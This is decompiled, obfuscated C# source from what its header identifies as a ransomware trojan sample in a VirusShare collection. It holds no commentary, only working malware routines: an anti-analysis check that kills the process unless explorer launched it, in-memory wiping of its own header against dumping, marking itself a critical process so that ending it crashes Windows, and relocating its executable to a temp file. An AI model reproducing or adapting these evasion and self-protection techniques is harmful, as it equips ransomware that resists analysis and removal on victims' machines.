// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ᕝᄟ኎ᖘӹڍශἐච͹ᙿᶈᕖ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  public static class ᕝᄟ\u128Eᖘӹڍශἐච\u0379ᙿᶈᕖ
  {
    public static void ᔌᖩᓓ௧ʣኃᛩᚘᬝჟ\u0082\u0387څѫઞ౬ᡴ()
    {
      if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᡴၳǒȺ\u0885\u0BFAӉ\u0DF4\u1AD9ఆᶅ)
        ᕝᄟ\u128Eᖘӹڍශἐච\u0379ᙿᶈᕖ.ᡇ᩵ḄᕁƮᔖű\u0008ॕᑱ();
      if (\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ਗ਼Շᆋႉᜲ\u00AE\u0AD1ᨺԪሁ\u0837iඍ\u0E67᪼\u0B70Ȗ && !ᕝᄟ\u128Eᖘӹڍශἐච\u0379ᙿᶈᕖ.ᐋ\u0703\u0E69\u192Eܠᢑᵾ᧑)
        Process.GetCurrentProcess().Kill();
      if (!\u1DDFᶴʆᨆჳᖞḷข᱑\u0A60\u0EF9ᩚ.ᶘ\u19DFᒉசᙽᎨᝀᏉᓜ\u00A6ᨃᅟై)
        return;
      ᕝᄟ\u128Eᖘӹڍශἐච\u0379ᙿᶈᕖ.ᄬཇ\u0C5D\u0BE4គᄨࡘᏺ\u1B4Cᮎ();
    }

    public static void ᡇ᩵ḄᕁƮᔖű\u0008ॕᑱ()
    {
      try
      {
        IntPtr num = វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.գǑไ້Хࣹᎇಒڶ\u02C5\u0F2Cൽ((string) null);
        វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.\u02F3࣪ܟϟᓿӿᐄᩆႻᑴᩚচᤙΈ(num, 512U, 4U, out uint _);
        វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.Ëሽᄄᗻ\u19DE\u0DE1ᅉ\u0482Ꮮ(num, (IntPtr) 512);
      }
      catch
      {
      }
    }

    public static void ᄬཇ\u0C5D\u0BE4គᄨࡘᏺ\u1B4Cᮎ()
    {
      try
      {
        int num = 1;
        វ\u00B7᭘œᐬ\u0B11॔\u087Fܮ\u0E77\u09F2.LȰሾ\u0FF4ᡣי\u08D1ἸԂጃᕯࣤ(Process.GetCurrentProcess().Handle, 29, ref num, 4);
      }
      catch
      {
      }
    }

    public static bool ᐋ\u0703\u0E69\u192Eܠᢑᵾ᧑
    {
      get
      {
        using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
        {
          managementObject.Get();
          return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
        }
      }
    }

    public static void \u08DFኧᱫᘭॡ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        string destFileName = tempFileName.Replace(".tmp", ".exe");
        File.Move(Process.GetCurrentProcess().MainModule.FileName, destFileName);
      }
      catch
      {
      }
    }
  }
}
